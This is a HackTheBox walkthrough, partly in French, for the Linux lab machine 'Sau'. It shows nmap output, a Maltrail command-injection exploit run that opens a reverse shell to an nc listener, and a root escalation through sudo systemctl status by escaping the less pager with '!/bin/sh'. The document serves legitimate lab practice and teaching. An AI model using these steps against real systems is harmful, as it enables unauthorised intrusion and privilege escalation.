---
title: HTB | Sau
description: Sau is an Easy Difficulty Linux machine that features a  Request Baskets instance that is vulnerable to Server-Side Request Forgery (SSRF) via CVE-2023-27163. Leveraging the vulnerability we are to gain access to a Maltrail instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as puma. A sudo misconfiguration is then exploited to gain a root shell.
slug: sau-htb
date: 2023-12-28 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Sau cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Sau</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.224</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC 10.10.11.224 -A -n
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 27 Dec 2023 23:03:42 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 27 Dec 2023 23:03:16 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 27 Dec 2023 23:03:16 GMT
|_    Content-Length: 0
```

## Foothold

### Exploitation request-baskets
```bash
I found a CVE online and I exploit it
```

### Exploitation Maltrail
```bash
┌──(kali㉿kali)-[~/HTB/Sau/maltrail-exploit/Maltrail-v0.53-Exploit]
└─$ python3 exploit.py 10.10.14.160 55555 http://10.10.11.224:55555/pleffy
Running exploit on http://10.10.11.224:55555/pleffy/login
```

### Reverse Shell
Open reverse shell. Listening with nc at the same time we launch the exploit.py
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvp 55555                  
[sudo] Mot de passe de kali : 
listening on [any] 55555 ...
10.10.11.224: inverse host lookup failed: Unknown host
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.224] 50528
$ ls
ls
CHANGELOG     core    maltrail-sensor.service  plugins           thirdparty
CITATION.cff  docker  maltrail-server.service  requirements.txt  trails
LICENSE       h       maltrail.conf            sensor.py
README.md     html    misc                     server.py
$ whoami
whoami
puma
```

### Open python bash
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
puma@sau:~$ whoami 
whoami
puma
```

### User flag
```bash
puma@sau:~$ ls  
ls
linpeas.sh  systemctl  u  user.txt
puma@sau:~$ cat user*   
cat user*
d302.....b9f0
```

## Privilege Escalation

### Enumeration
```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```
On peut voir qu'il peut executer cette commande en tant qu'administrateur :
```bash
sudo /usr/bin/systemctl status trail.service
```

### systemctl status trail.service
Lorsqu'on l'execute, on observe que la commande utilise `less`. Or, si less est executé en tant qu'administrateur, on peut lancer un shell en tant que root. J'ai pu trouver cette information en cherchant sur ce site :

https://gtfobins.github.io/gtfobins/less/

Par exemple, on peut écrire: **!/bin/sh**  
Lorsque less est executé en tant qu'admin, ça doit lancer un shell en tant que root

### Exploit : less
```bash
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/sh 
!//bbiinn//sshh!/bin/sh
# whoami
whoami
root
# cd /root 
cd /root
# ls
ls
go  root.txt
# cat roo*
cat roo*
047d.....6de3
```
